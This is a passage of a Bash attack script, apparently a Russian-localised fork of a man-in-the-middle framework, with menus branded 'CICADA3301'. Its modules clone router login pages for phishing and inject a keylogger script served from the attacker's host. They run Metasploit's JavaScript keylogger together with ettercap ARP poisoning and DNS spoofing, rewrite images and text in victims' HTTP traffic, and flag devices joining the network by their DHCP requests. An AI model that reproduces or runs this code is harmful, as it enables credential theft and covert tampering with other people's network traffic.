  elif [ "$PHiS" = "Default" ]; then
    sed -i "s/MoDemIP/$MIP/" login.html
  elif [ "$PHiS" = "TPLink" ]; then
    :
  elif [ "$PHiS" = "ZTE" ]; then
    sed -i "s/MoDemIP/www.google.im/" login.html
  elif [ "$PHiS" = "Technicolor" ]; then
    sed -i "s/MoDemIP/www.google.im/" login.html
  else
    sed -i "s/MoDemIP/$MIP/" login.html
  fi
  echo ${BlueF}[☠]${white} Inject javascript Into clone webpage${RedF}!${Reset};
  sleep 1

  # chose 2º phishing webpage to use
  if [ "$PHiS" = "Meo" ]; then
    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" new.html > copy.html
  elif [ "$PHiS" = "DLink" ]; then
    cd DLINK
    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
    cd ..
  elif [ "$PHiS" = "TPLink" ]; then
    cd TPLink
    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
    cd ..
  elif [ "$PHiS" = "ZTE" ]; then
    cd ZTE
    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
    cd ..
  elif [ "$PHiS" = "Technicolor" ]; then
    cd Technicolor
    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
    cd ..
  else
    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
  fi
  mv copy.html index.html > /dev/null 2>&1
  sed -i "s|GatWa|$GaTe|g" index.html
  sed -i "s|DiSpt|$InjE|g" index.html
  # copy all files to apache2 webroot
  echo ${BlueF}[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
  sleep 2
  cp index.html $ApachE/index.html # NO dev/null to report file not existence
  cp login.html $ApachE/login.html > /dev/null 2>&1
  cd ..
  cp -r $IPATH/bin/phishing/router-modem $ApachE/router-modem > /dev/null 2>&1
  cd $IPATH

    # backup all files needed.
    echo ${BlueF}[☠]${white} Backup all files needed${RedF}!${Reset};
    cd $IPATH/bin
    cp $IPATH/bin/etter.dns $IPATH/bin/etter.rb # backup (NO dev/null to report file not existence)
    cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
    sleep 1
    # use SED bash command
    sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
    sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
    cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
    echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
    cd $IPATH
    sleep 1


    # start metasploit services
    echo ${BlueF}[☠]${white} Start metasploit services...${Reset};
    service postgresql start > /dev/null 2>&1
    if [ "$RbUdB" = "YES" ]; then
    msfdb delete > /dev/null 2>&1
    msfdb init > /dev/null 2>&1
    fi

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Запуск веб-сервера apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "MSFCONSOLE" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost// /$gateway//
      else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "CICADA3301 TCP/IP Bednakov-Xack-Live" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost/ /$gateway/
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $LoGmSf/*.txt $IPATH/logs > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/bin/phishing/router-modem/index.rb $IPATH/bin/phishing/router-modem/index.html
  mv $IPATH/bin/phishing/router-modem/login.rb $IPATH/bin/phishing/router-modem/login.html
  mv $IPATH/bin/phishing/router-modem/new.rb $IPATH/bin/phishing/router-modem/new.html > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  rm $IPATH/output/retrieve.log > /dev/null 2>&1
  rm $ApachE/index.html > /dev/null 2>&1
  rm $ApachE/login.html > /dev/null 2>&1
  rm -r $ApachE/router-modem > /dev/null 2>&1
  rm -r $ApachE/DLINK > /dev/null 2>&1
  rm -r $ApachE/TPLink > /dev/null 2>&1
  rm -r $ApachE/ZTE > /dev/null 2>&1
  rm -r $ApachE/Technicolor > /dev/null 2>&1
  # rm -r $IPATH/output/clone > /dev/null 2>&1
  cd $IPATH

# start apache2 webserver...
echo ${BlueF}[☠]${white} Stop apache2 webserver...${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Остановите веб-сервер apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
service postgresql stop > /dev/null 2>&1
# check if exist any reports
dd=`ls $IPATH/logs`
if ! [ -z "$dd" ]; then
Qu=$(zenity --info --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "сохраненные лог-файлы $IPATH/logs" --width 270) > /dev/null 2>&1
fi

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# --------------------------------
# INJECT IMAGE INTO TARGET WEBSITE
# --------------------------------
sh_stage15 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}     Этот фильтр заменит HTML-тег '<img src =>' и       ${BlueF}|"
echo "${BlueF}    | ${YellowF}  внедряет ваше изображение в любую веб-страницу, запрошенную целью (http)    ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  ВНИМАНИЕ: Это не гарантирует, что этот фильтр будет работать с   ${BlueF}|"
echo "${BlueF}    | ${YellowF}последние реализации безопасности добавлены в современные веб-браузеры (hsts) ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.rb > /dev/null 2>&1
sleep 1

  echo ${BlueF}[☠]${white} Edit img_replace.eft${RedF}!${Reset};
  sleep 1
 fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "пример: $IP\nвыбрал цель для фильтрации через морфеус." --entry --width 270) > /dev/null 2>&1
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|TaRONE|$fil_one|g" img_replace.eft # NO dev/null to report file not existence :D
  cd $IPATH
  zenity --info --title="☠ CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ ☠" --text "Инфраструктура CICADA3301 теперь дает вам\возможность просто запустить фильтр\для дальнейшего его сценариев ...\n\n'Подробнее его писать'..." --width 270 > /dev/null 2>&1
  xterm -T "CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ" -geometry 115x36 -e "nano $IPATH/filters/img_replace.eft"
  sleep 1

    # compiling img_replace.eft to be used in ettercap
    echo ${BlueF}[☠]${white} составление img_replace.eft${RedF}!${Reset};
    xterm -T "CICADA3301 - составление" -geometry 90x26 -e "etterfilter $IPATH/filters/img_replace.eft -o $IPATH/output/img_replace.ef && sleep 3"
    sleep 1
    #
    # port-forward
    #
    echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      # HINT: irongeek nao usou UID 0 e SSL active...


      echo ${BlueF}[☠]${white} access this url to test${RedF}:${GreenF} http://antt.dglab.gov.pt/${Reset};
      echo ${BlueF}[☠]${white} Remenber that this kind of attack works better againts Internet Explorer${Reset};
      sleep 2
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M arp:remote /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M arp:remote /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M arp:remote /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M arp:remote /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
  #
  # port-forward
  #
  echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/img_replace.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}




# --------------------------------
# REPLACE TEXT INTO TCP RESPONSE
# --------------------------------
sh_stage16 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}   Этот фильтр заменит текст в целевых tcp-ответах (http)   ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  ВНИМАНИЕ: Это не гарантирует, что этот фильтр будет работать с   ${BlueF}|"
echo "${BlueF}    | ${YellowF}последние реализации безопасности добавлены в современные веб-браузеры (hsts) ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
cp $IPATH/filters/text_replace.eft $IPATH/filters/text_replace.rb > /dev/null 2>&1
sleep 1

  echo ${BlueF}[☠]${white} Edit text_replace.eft${RedF}!${Reset};
  sleep 1
 fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "пример: $IP\выбрал цель для фильтрации через морфеус." --entry --width 270) > /dev/null 2>&1
 rep_one=$(zenity --title="☠ СЛОВО ЗАМЕНИТЬ ☠" --text "пример: привет\Выберите слово для замены в пакете tcp." --entry --width 270) > /dev/null 2>&1
 rep_two=$(zenity --title="☠ СЛОВО ЗАМЕНИТЬ ☠" --text "выбрано предыдущее слово: $rep_one\Ремменбер: заменяемый мир должен быть такой же длины, как и предыдущий" --entry --width 270) > /dev/null 2>&1
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|IpAdDR|$fil_one|g" text_replace.eft # NO dev/null to report file not existence :D
  sed -i "s|RePlAcE|$rep_one|g" text_replace.eft > /dev/null 2>&1
  sed -i "s|InJeC|$rep_two|g" text_replace.eft > /dev/null 2>&1
  cd $IPATH
  zenity --info --title="☠ CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ ☠" --text "CICADA3301 Framework теперь дает вам\возможность просто запустить фильтр\ для дальнейшего его скриптинга ...\n\n'Подробнее писать его для скриптов'..." --width 270 > /dev/null 2>&1
  xterm -T "CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ" -geometry 115x36 -e "nano $IPATH/filters/text_replace.eft"
  sleep 1

    # compiling img_replace.eft to be used in ettercap
    echo ${BlueF}[☠]${white} составление text_replace.eft${RedF}!${Reset};
    xterm -T "CICADA3301 - составление" -geometry 90x26 -e "etterfilter $IPATH/filters/text_replace.eft -o $IPATH/output/text_replace.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      # HINT: irongeek nao usou UID 0 e SSL active...
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/text_replace.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/text_replace.ef -L $IPATH/logs/text_replace -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/text_replace.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/text_replace.ef -L $IPATH/logs/text_replace -M ARP /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/text_replace.rb $IPATH/filters/text_replace.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/text_replace.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# ----------------------
# WRITE YOUR OWN FILTER
# ----------------------
sh_stageW () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    Этот модуль позволит вам написать собственный фильтр с нуля.  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  CICADA3301 представляет «шаблон» предыдущей сборки для вас, чтобы написать  ${BlueF}|"
echo "${BlueF}    | ${YellowF} ваша собственная логика команд и автоматизировать компиляцию/ланч фильтра. ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/template.eft $IPATH/filters/template.rb > /dev/null 2>&1
  sleep 1

  echo ${BlueF}[☠]${white} Edit template${RedF}!${Reset};
  xterm -T "CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ" -geometry 115x36 -e "nano $IPATH/filters/template.eft"
  sleep 1


    # compiling template.eft to be used in ettercap
    echo ${BlueF}[☠]${white} составление template${RedF}!${Reset};
    xterm -T "CICADA3301 - составление" -geometry 90x26 -e "etterfilter $IPATH/filters/template.eft -o $IPATH/output/template.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2

      #
      # execute warn.sh (BEEP) script ?
      #
      warnme=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить сценарий warn.sh? \N\nПРЕДУПРЕЖДЕНИЕ: ваш фильтр должен содержать\nприведенное правило для запуска звуковых сигналов:\nlog (DATA.data, \"./beep-warning.beep\");" --width 290) > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
        # check if: log(DATA.data, "./beep-warning.beep"); API exists in template ..
        cfg=`cat $IPATH/filters/template.eft | grep "log(DATA.data, \"./beep-warning.beep\");"`
        if [ "$?" -eq "0" ]; then
          xterm -T "CICADA3301 - warn.sh" -geometry 108x24 -e "cd $IPATH/bin && ./warn.sh" &
        else
          echo ${RedF}[x]${white} Filter rule:${YellowF}" log(DATA.data, \"./beep-warning.beep\");"${Reset};
          echo ${RedF}[x] Not found inside Filter, aborting warn.sh execution ..${Reset};
          sleep 4
        fi
      fi

      cd $IPATH/logs
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  sleep 2
  mv $IPATH/filters/template.rb $IPATH/filters/template.eft > /dev/null 2>&1
  rm $IPATH/output/template.ef > /dev/null 2>&1
  # HINT: warn.sh script will run in backgroud if we dont kill the process ..
  if [ "$warnme" = "execute warn.sh" ]; then
    killall warn.sh > dev/null 2>&1
  fi
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}




# ----------------------------------------
# DHCP DISCOVER (smartphones & PCs)
# ----------------------------------------
sh_stage17 () {

echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}Этот модуль захватывает выбранный запрос «устройства» для доступа к локальному${BlueF}|"
echo "${BlueF}    | ${YellowF} LAN (bootp-dhcp 67 / UDP) и запускает одно звуковое предупреждение (BEEP). ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}                          -- ПРЕДУПРЕЖДЕНИЕ --                           ${BlueF}|"
echo "${BlueF}    | ${YellowF} Если входное доменное имя (цель для фильтрации) НЕ содержит каких-либо ${BlueF}|"
echo "${BlueF}    | ${YellowF} числа в конце строки (например, android-dd4e5d9sy670) затем ${BlueF}|"
echo "${BlueF}    | ${YellowF} нам нужно дождаться окон терминала «CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ»${BlueF}|"
echo "${BlueF}    | ${YellowF} удалить номер 7 из имени домена (добавьте номер 7 в CICADA3301 ${BlueF}|"
echo "${BlueF}    | ${YellowF} конец доменного имени для смартфонов обнаружения/обнаружения). ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2

# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "[ DHCP-обнаружение устройств]\Этот модуль позволяет пользователям фильтровать любое устройство\(имя домена ИЛИ IP-адрес), которое пытается получить доступ к нашей локальной сети в первый раз (аутентификация)\n\Выполнить этот модуль?" --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


# chose to input one or two targets to filter
Tc=$(zenity --list --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Этот модуль позволяет пользователям фильтровать одну или две цели" --radiolist --column "Pick" --column "Option" TRUE "one target input" FALSE "two targets input" --width 300 --height 180) > /dev/null 2>&1


# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
sleep 1
cp $IPATH/filters/dhcp-discovery.eft $IPATH/filters/dhcp-discovery.bak > /dev/null 2>&1
rhost=$(zenity --title="☠ УСТРОЙСТВО ДЛЯ ФИЛЬТРА ☠" --text "пример: android-c6216f4h7297e1ef\Выберите удаленную цель для фильтрации через CICADA3301." --entry --width 270) > /dev/null 2>&1
CeDs=$(zenity --title="☠ DEVICE DESCRIPTION ☠" --text "Дайте описание устройства \ пример: мобильный телефон (Denis)" --entry --width 270) > /dev/null 2>&1
#
# pasing rtarget ip addr (add number 7 at the end of domain-name)
#
store=`echo "$rhost""7"`
echo "$store" > $IPATH/logs/parse



if [ "$Tc" = "ввод двух целей" ]; then
Most=$(zenity --title="☠ УСТРОЙСТВО ДЛЯ ФИЛЬТРА ☠" --text "пример: android-c6216f4h7297e1ef \ Выберите удаленную цель для фильтрации через CICADA3301." --entry --width 270) > /dev/null 2>&1
Desc=$(zenity --title="☠ ОПИСАНИЕ УСТРОЙСТВА ☠" --text "Дайте описание устройства \ пример: мобильный телефон (Denis)" --entry --width 270) > /dev/null 2>&1

  #
  # parsing data (add number 7 at the end of domain-name)
  #
  twoop=`echo "$Most""7"`
  echo "$twoop" > $IPATH/logs/triggertwo

  # write the rest of the filter (injects into existing filter)
  echo "" >> $IPATH/filters/dhcp-discovery.eft
  echo "if (ip.src == '0.0.0.0' && ip.proto == UDP && udp.dst == 67) {" >> $IPATH/filters/dhcp-discovery.eft
  echo "  if (search(DATA.data, \"$twoop\")) {" >> $IPATH/filters/dhcp-discovery.eft
  echo "  msg(\".\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[morpheus] host:0.0.0.0 [ ⊶  ]  found ..\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[morpheus] | status  : Request access to LAN\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[morpheus] |   port  : 67/UDP(dst) bootp-DHCP ✔\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[morpheus] |   id    : $twoop\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[morpheus] |_  device: $Desc\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\".\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    log(DECODED.data, \"./beep-warning.beep\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    log(DECODED.data, \"./triggertwo.bin\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "  }" >> $IPATH/filters/dhcp-discovery.eft
  echo "}" >> $IPATH/filters/dhcp-discovery.eft

fi


  cd $IPATH/filters
  # replace values in template.filter with sed bash command
  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sed -i "s|rTdN|$store|g" dhcp-discovery.eft
  sed -i "s|FtGh|$CeDs|g" dhcp-discovery.eft
  cd $IPATH
  zenity --info --title="☠ CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ ☠" --text "CICADA3301 рамки теперь дает вам возможность просто запустить фильтр\ИЛИ к дальнейшему написанию сценариев...\n\n'Получайте удовольствие от написания сценариев'..." --width 270 > /dev/null 2>&1
  xterm -T "CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ" -geometry 115x36 -e "nano $IPATH/filters/dhcp-discovery.eft"
  sleep 1

    # compiling firewall.eft to be used in ettercap
    echo ${BlueF}[☠]${white} составление dhcp-discovery.eft${RedF}!${Reset};
    xterm -T "CICADA3301 - составление" -geometry 90x26 -e "etterfilter $IPATH/filters/dhcp-discovery.eft -o $IPATH/output/dhcp-discovery.ef && sleep 3"
    sleep 1
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "CICADA3301 - захват устройств" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -M ARP /// ///
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "CICADA3301 - захват устройств" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -L $IPATH/logs/dhcp-discovery.log -M ARP /// ///
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "CICADA3301 - захват устройств" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -M ARP // //
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "CICADA3301 - захват устройств" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -L $IPATH/logs/dhcp-discovery.log -M ARP // //
        fi
      fi

  # check if exist any reports (.log files)
  if [ -e $IPATH/logs/$store.log ] || [ -e $IPATH/logs/$twoop.log ]; then
  Qu=$(zenity --info --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "сохраненные лог-файлы $IPATH/logs" --width 270) > /dev/null 2>&1
  fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  sleep 2
  mv $IPATH/filters/dhcp-discovery.bak $IPATH/filters/dhcp-discovery.eft > /dev/null 2>&1
  rm $IPATH/output/dhcp-discovery.ef > /dev/null 2>&1
  rm $IPATH/logs/parse > /dev/null 2>&1
  rm $IPATH/logs/triggertwo > /dev/nul 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}





# -------------------------------
# BLOCK CRYPTOMINNING CONNECTIONS
# -------------------------------
sh_stage18 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}Этот фильтр будет действовать как брандмауэр, сообщающий и блокирующий криптографию${BlueF}|"
echo "${BlueF}    | ${YellowF}Миннирование валютных соединений внутри локальной сети (выбранная цель)   ${BlueF}|"
echo "${BlueF}    | ${YellowF}Если соединение найдено на выбранной машине (IP-адрес), то  ${BlueF}|"
echo "${BlueF}    | ${YellowF}этот фильтр предупредит пользователей фреймворка и сбросит/убьет миннинг  ${BlueF}|"
echo "${BlueF}    | ${YellowF}соединение (пакеты tcp/udp) и записывает файл журнала в папку журналов.${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
